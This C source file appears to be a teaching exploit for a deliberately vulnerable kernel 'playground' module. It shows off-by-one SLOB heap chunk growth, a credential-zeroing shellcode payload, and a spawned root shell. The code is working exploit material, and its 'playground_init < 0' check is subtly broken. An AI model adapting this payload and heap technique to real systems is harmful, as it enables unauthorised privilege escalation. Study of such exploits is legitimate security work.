/*
 * SLOB chunk growth example for libplayground
 * Copyright (c) 2012 Dan Rosenberg (@djrbliss)
 *
 * Example of exploiting an off-by-one overflow in the SLOB allocator
 * by using the chunk growth technique.
 *
 * The idea is to overwrite the least significant byte of the size field
 * of an adjacent allocated or free chunk in order to grow that chunk. A
 * subsequent allocation of a larger chunk will cause the allocator to return
 * memory where the second portion of the chunk will overlap with a previously
 * allocated chunk, allowing attacker-controlled data to be written on top of
 * a useful target (such as a structure with function pointers).
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation; either version 2 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <playground.h>

/* Payload */
int getroot(void)
{

	/* Don't you dare use this awful hack in real life, your offsets are
	 * probably not the same as these */
	asm(	"movl $0xffffe000, %eax\n"
		"andl %esp, %eax\n"
		"movl (%eax), %eax\n"
		"movl 0x2c0(%eax), %eax\n"
		"movl $0x0, 0x4(%eax)\n"
		"movl $0x0, 0x8(%eax)\n"
		"movl $0x0, 0xc(%eax)\n"
		"movl $0x0, 0x10(%eax)\n"
		"movl $0x0, 0x14(%eax)\n"
		"movl $0x0, 0x18(%eax)\n"
		"movl $0x0, 0x1c(%eax)\n"
		"movl $0x0, 0x20(%eax)\n"
		"movl $0xffffffff, %eax\n"	);

}

void off_by_one(void)
{
	char buf[65];

	/* Overwrite the next chunk size */
	memset(buf, 0, 64);
	buf[64] = 0x80;
	kwrite(997, 65, buf);

	/* Free it and reallocate it, filling it with 0x40 */
	kfree(998);
	kmalloc_fill(998, 0x70, 0x40);

	/* Trigger a function pointer in the chunk after the grown chunk to
	 * win */
	ktrigger(999, 2);
}

int main(int argc, char **argv)
{
	int i;
	char *payload;

	if (!getuid()) {
		printf("[-] Psst...you're running as root already...\n");
		return 1;
	}

	printf("[*] Mapping payload...\n");

	/* Map payload at 0x40404040 */
	payload = mmap((void *)0x40404000, 0x2000, PROT_READ | PROT_WRITE |
			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (payload == MAP_FAILED) {
		printf("[-] Failed to map payload.\n");
		return 1;
	}

	memcpy((void *)0x40404040, &getroot, 1024);

	/* Open our kmalloc playground device */
	if (playground_init < 0) {
		printf("[-] Failed to initialize playground.\n");
		return 1;
	}

	/* Exhaust partially filled pages to trigger allocation of a fresh page,
	 * in which our allocations will be sequential */
	printf("[*] Exhausting partially filled pages...\n");

	for (i = 0; i < 1000; i++) {
		kmalloc_fill(i, 64, 'A');
	}

	/* Trigger exploitation of our off-by-one overflow */
	off_by_one(); 

	/* It's a good idea to avoid print statements in the middle of kernel
 	 * heap exploits, since write(2) may alter the kernel heap state. */
	printf("[*] Triggered off-by-one overflow...\n");

	playground_close();

	if (!getuid()) {
		printf("[+] Got root!\n");
		execl("/bin/sh", "/bin/sh", NULL);
	} else {
		printf("[-] Failed to get root.\n");
		return 1;
	}
}
